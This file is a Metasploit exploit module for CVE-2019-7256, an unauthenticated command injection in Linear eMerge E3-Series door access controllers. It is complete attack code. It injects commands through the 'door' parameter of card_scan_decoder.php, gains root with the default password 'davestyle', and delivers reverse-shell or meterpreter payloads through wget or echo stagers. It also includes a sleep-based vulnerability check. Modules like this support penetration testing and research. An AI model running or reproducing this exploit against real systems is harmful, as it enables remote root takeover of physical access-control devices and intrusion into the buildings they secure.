##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linear eMerge E3-Series Access Controller Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in the Linear eMerge
          E3-Series Access Controller. The Linear eMerge E3 versions `1.00-06` and below are vulnerable
          to unauthenticated command injection in card_scan_decoder.php via the  `No` and `door` HTTP GET parameter.
          Successful exploitation results in command execution as the `root` user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Gjoko Krstic <gjoko[at]applied-risk.com>', # Discovery
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor
        ],
        'References' => [
          [ 'CVE', '2019-7256'],
          [ 'URL', 'https://applied-risk.com/resources/ar-2019-005' ],
          [ 'URL', 'https://na.niceforyou.com/' ],
          [ 'URL', 'https://attackerkb.com/topics/8WUJkci8N4/cve-2019-7256' ],
          [ 'EDB', '47649'],
          [ 'PACKETSTORM', '155256']
        ],
        'DisclosureDate' => '2019-10-29',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_ARMLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_ARMLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'wget', 'printf', 'echo' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('ROOT_PASSWORD', [ true, 'default root password on a vulnerable Linear eMerge E3-Series access controller', 'davestyle']),
      ]
    )
  end

  def execute_command(cmd, _opts = {})
    random_no = rand(30..100)
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'card_scan_decoder.php'),
      'vars_get' =>
        {
          'No' => random_no,
          'door' => "`echo #{datastore['ROOT_PASSWORD']}|su -c \"#{cmd}\"`"
        }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end

  # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
  def check
    print_status("Checking if #{peer} can be exploited.")
    sleep_time = rand(2..10)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end

    return CheckCode::Unknown('No response received from the target!') unless res
    return CheckCode::Safe('Target is not affected by this vulnerability.') unless res.code == 200 && !res.body.blank? && res.body =~ /"card_format_default":"/

    print_status("Elapsed time: #{elapsed_time.round(2)} seconds.")
    return CheckCode::Safe('Command injection test failed.') unless elapsed_time >= sleep_time

    CheckCode::Vulnerable('Successfully tested command injection.')
  end

  def exploit
    case target['Type']
    when :unix_cmd
      print_status("Executing #{target.name} with #{payload.encoded}")
      execute_command(payload.encoded)
    when :linux_dropper
      print_status("Executing #{target.name}")
      execute_cmdstager(linemax: 262144)
    end
  end
end
